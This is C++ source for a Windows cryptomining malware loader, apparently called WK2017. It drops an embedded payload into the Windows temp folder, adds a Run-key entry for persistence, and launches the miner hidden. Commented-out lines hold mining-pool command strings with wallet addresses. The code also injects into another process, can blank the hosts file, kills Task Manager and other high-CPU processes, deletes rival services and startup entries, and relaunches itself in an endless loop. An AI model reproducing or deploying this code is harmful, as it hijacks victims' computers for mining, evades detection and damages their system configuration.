// WK2017.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "WK2017.h"


#include "injection.h"
#include "CPUusage.h"
#include "ShellCode.h"


//#include "WkRat.h"
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#include <iomanip>
/*#include <winbase.h>*/
#include <windows.h>
#include <Tlhelp32.h>
#include <string.h>
#include <WinSvc.h>
#pragma comment(linker, "/opt:nowin98") 
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "ADVAPI32.lib")
#pragma comment (lib, "shell32.lib")
#pragma comment (lib, "kernel32.lib")
#pragma comment (lib, "msvcrt.lib")
#pragma comment (lib, "nafxcw.lib")
#include <map>
using namespace std;
///////////////
 struct FALLEN_DATA
{
	unsigned int finder;
	char xxs[1000];			//运行命令
	char filename[255];		//释放的文件名
	char service[255];		//k的服务名
	char Registry[255];		//k的注册表名
	char winProcess[255];	//k的win进程名
	char linuxProcess[255]; //k的linux进程名
	char wininj[100];		//注入的win进程
	char SerName[100];		//服务名称
	char Serdisplay[128];	//显示名称
	char Serdesc[256];		//服务描述
	bool log;				//输出log
	bool hosts;				//还原hosts
}
fallen_data =
{
	0xF9E28F8D,
	"xxs",
	"filename",
	"123:456",
	"123",
	"abc.exe",
	"abc",
	"wps.exe",
	"fuwmc",
	"xiansmc",
	"fuwumiaosu",
	false,
	false,
};
int lservice;
int lRegistry;
int lwinProcess;

map<int,CString> cutting(char* str,int count)
{
	map<int,CString> abc;
	char A[2] =":";
	if (strcmp(str,"0"))
	{
		const char s[2] = ":";
		char *token;
		token = strtok(str, s);
		while( token != NULL ) 
		{
			count++;
			abc[(int)count]=token;
			token = strtok(NULL, s);
		}
	}
	return abc;
	
}	
map<int,CString> winProcess1;
map<int,CString> service1;
map<int,CString> Registry1;
void asscutting()
{
	
	if (strcmp(fallen_data.winProcess,"0"))
	{
		winProcess1=cutting(fallen_data.winProcess,lwinProcess);
	}
	if (strcmp(fallen_data.service,"0"))
	{
		service1=cutting(fallen_data.service,lservice);
	}
	if (strcmp(fallen_data.Registry,"0"))
	{
		Registry1=cutting(fallen_data.Registry,lRegistry);
	}

}
/////////////////
BOOL IsExistProcess(CONST CHAR* szProcessName)  //进程判断
{  
    PROCESSENTRY32 processEntry32;   
    HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,  0);  
    if (((int)toolHelp32Snapshot) != -1)  
    {  
        processEntry32.dwSize = sizeof(processEntry32);  
        if (Process32First(toolHelp32Snapshot, &processEntry32))  
        {  
            do  
            {  
                if(strcmp(szProcessName ,processEntry32.szExeFile) == 0)  
                {  
                    return TRUE;  
                }  
            }while (Process32Next(toolHelp32Snapshot, &processEntry32));  
        }  
        CloseHandle(toolHelp32Snapshot);  
    }  
	
    return FALSE;  
}  




void mining()
{
	 CHAR szRunPath[MAX_PATH];
	 ZeroMemory(szRunPath, MAX_PATH);
	 GetModuleFileNameA(NULL, szRunPath, MAX_PATH);
	 HKEY hkey;
	 RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
	 RegSetValueExA(hkey, fallen_data.SerName, 0, REG_SZ, (const unsigned char*)(LPCTSTR)szRunPath, strlen(szRunPath));
	 RegCloseKey(hkey);//开机启用
	 CHAR szWindowsTempDri[MAX_PATH];
	 ZeroMemory(szWindowsTempDri, MAX_PATH);
	 GetWindowsDirectoryA(szWindowsTempDri, MAX_PATH);//GetWindowsDirectory是一个函数，用以获取Windows目录的完整路径名。即系统的windows目录
	 strcat(szWindowsTempDri, "//temp");
	 CHAR szFileName[MAX_PATH] = { 0 };
	 //char SAiGt[] = {' ','-','a',' ','c','r','y','p','t','o','n','i','g','h','t',' ','-','o',' ','s','t','r','a','t','u','m','+','t','c','p',':','/','/','k','r','b','.','m','i','n','e','r','.','r','o','c','k','s',':','3','3','3','3',' ','- ','u',' ','K','b','i','X','2','K','H','s','7','a','p','1','j','s','R','2','m','V','N','k','G','j','c','Y','p','j','c','n','A','E','r','9','y','3','Q','S','2','5','b','s','x','p','C','i','X','H','h','r','f','j','g','C','z','9','z','a','z','w','x','w','N','E','C','N','K','c','Q','h','B','P','s','S','P','p','t','z','E','5','U','8','a','K','W','1','M','Q','n','u','T','W','j','a','2','J','W',' ','-','p',' ','x',' ','-','-','d','o','n','a','t','e','-','l','e','v','e','l','=','1','\0'};
     // char SAiGt[] = { "  -o stratum+tcp://pool.minexmr.com:5555 -u 44c4syaMqg2BBd1ALNtAihD19dKoQX4qiCXCsZqxSWuv7zkZoAmwATSiMR7DVPRirD8Dnzd3ZiByQgchX2CheVcD4Hzh7ne -p x --donate-level=1 --max-cpu-usage=75 " };
	 wsprintfA(szFileName, "%s\\%s", szWindowsTempDri, fallen_data.filename);//连接
	 ShellCodeSaveFile(szFileName);//释放文件	
	 Sleep(0x1F4);
	 ShellExecuteA(NULL, "open", szFileName, fallen_data.xxs, NULL, SW_HIDE);//代命令运行文件
}

 DWORD Kid()
 {
	 PROCESSENTRY32 pe;
	 DWORD id = 0;
	 char* K_pid = "ntsd -c q -p ";
	 char* pid;
	 HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	 pe.dwSize = sizeof(PROCESSENTRY32);
	 if (!Process32First(hSnapshot, &pe))
		 return 0;
	 while (1)
	 {
		 pe.dwSize = sizeof(PROCESSENTRY32);
		 if (Process32Next(hSnapshot, &pe) == FALSE)
			 break;
		 id = pe.th32ProcessID;
		 CPUusage usg(id);
		 float  cpu;
		 float cpus = 30.00;
		 for (int i = 0; i < 10; i++)
		 {
			 cpu = usg.get_cpu_usage();
			 Sleep(50);
		 }
		 if (cpu > cpus)
		 {
			 if (strcmp(fallen_data.filename,pe.szExeFile) != 0)//看看是不是自己啦
			 {
				 HANDLE hProcessHandle;
				 hProcessHandle = ::OpenProcess(PROCESS_TERMINATE, FALSE, id);
				 return ::TerminateProcess(hProcessHandle, 4);
			 }
		 }
	 }
	 CloseHandle(hSnapshot);
	 return 0;
 }

void func()
{
	asscutting();
	if (strcmp(fallen_data.winProcess,"0"))
	{
		for (int i= 0;i<lwinProcess;i++)
		{
			char tmp [50]="taskkill /f /im ";
			strcat(tmp,winProcess1[i]);
			WinExec(tmp,SW_HIDE);
		}
		
		
	}
	if (strcmp(fallen_data.service,"0"))
	{
		SC_HANDLE service, scm;
		scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
		for (int i= 0;i<lservice;i++)
		{
			service = OpenService(scm, service1[i],SERVICE_ALL_ACCESS | DELETE);
			DeleteService(service);
		}
		
	}
	if (strcmp(fallen_data.Registry,"0"))
	{
		HKEY hKey;
		RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE ,&hKey);
		for (int i= 0;i<lRegistry;i++)
		{
			RegDeleteValue(hKey,Registry1[i]);
		}
		RegCloseKey(hKey);
		
	}


}
	
 int APIENTRY WinMain(HINSTANCE hInstance,
	 HINSTANCE hPrevInstance,
	 LPSTR     lpCmdLine,
	 int       nCmdShow)
{	

	if (!strcmp(fallen_data.wininj,"0"))
	{
		HANDLE RemoteThreadHandle; 
		EnablePriv();
		CreateRemoteThreadProc(fallen_data.wininj);//注入进程
	}
	if (fallen_data.hosts)
	{
		fclose(fopen("C:\\Windows\\System32\\drivers\\etc\\hosts", "w"));
	}
	func();
	strcat(fallen_data.filename,".exe");
	char gPoMW[] = {'t','a','s','k','k','i','l','l',' ','/','f',' ','/','i','m',' ','T','a','s','k','m','g','r','.','e','x','e','\0'};
	WinExec(gPoMW,SW_HIDE);  //先关闭一波任务管理器进程
	mining();//开始挖矿嘿嘿嘿
	while(1)
	{
		if (IsExistProcess(fallen_data.filename)==TRUE)//判断程序是否运行
		{		
			Kid();//杀死其他挖矿进程
			Sleep(600);
		}
		else//如果挖矿进程不存在了
		{
			func();
			Kid();//杀死其他挖矿进程
			mining();//开始挖矿
			Sleep(600);
		}
	}
	return 0;
}
